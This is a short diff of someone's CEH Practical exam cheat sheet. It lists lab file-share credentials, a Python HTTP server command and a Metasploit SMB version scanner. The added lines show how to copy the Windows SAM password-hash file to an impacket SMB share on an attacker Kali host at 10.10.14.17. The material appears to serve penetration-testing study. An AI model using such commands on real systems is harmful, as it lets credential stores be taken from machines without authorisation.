@@ -1,7 +1,11 @@
 [CEH Practical (6 hrs, 20 Lab Questions) +]
 -------------------------------------------
+[File Share +]
 smb://172.25.0.11 (Admin / Pa$$w0rd)  #Access CEH Tools
-python -m http.server 80  
+python -m http.server 80
+#Send to Kali
+   On kali: impacket-smbserver share .
+   win: copy SAM \\10.10.14.17\share\SAM
 chown -R www-data:www-data /var/www/html/share/  
 chmod -R 755 /var/www/html/share/  
 auxiliary/scanner/smb/smb_version #smb version check
